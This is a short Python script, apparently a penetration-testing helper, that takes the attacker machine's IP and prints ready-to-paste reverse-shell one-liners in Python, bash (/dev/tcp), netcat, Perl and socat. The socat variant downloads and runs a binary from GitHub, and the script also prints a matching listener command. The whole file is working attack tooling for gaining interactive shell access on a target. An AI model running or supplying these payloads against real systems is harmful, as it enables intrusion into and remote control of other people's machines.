#!/usr/bin/python3
import os
IP= os.popen("ifconfig | awk '/inet /{print $2}' | awk 'END{print}'").read().strip()

PORT = "6666"

python = "/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ IP +"\","+ PORT +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

bash = "bash -i >& /dev/tcp/"+IP+"/"+PORT+" 0>&1"

nc = "nc -e /bin/sh " + IP + " " + PORT

perl = "perl -e 'use Socket;$i=\""+IP+"\";$p="+PORT+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

socat = "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\"/bin/bash -li\",pty,stderr,setsid,sigint,sane tcp:"+IP+":"+PORT

socat_listen = "socat file:`tty`,raw,echo=0 tcp-listen:" + PORT


print(python + "\n")
print(bash + "\n")
print(nc + "\n")
print(perl + "\n")
print(socat + "\n")
print(socat_listen + "\n")
